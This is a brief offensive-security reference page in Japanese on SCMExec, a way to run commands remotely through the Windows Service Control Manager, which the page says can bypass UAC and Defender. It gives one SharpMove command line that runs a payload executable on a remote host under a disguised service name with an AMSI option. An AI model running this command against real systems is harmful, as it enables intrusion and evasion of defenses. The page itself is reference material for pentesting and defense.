# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** は、Service Control Manager (SCM) を使用してコマンドを実行するサービスを作成し、リモートシステム上でコマンドを実行する technique です。この方法は、User Account Control (UAC) や Windows Defender など、一部のセキュリティ制御を bypass できます。

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## References

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
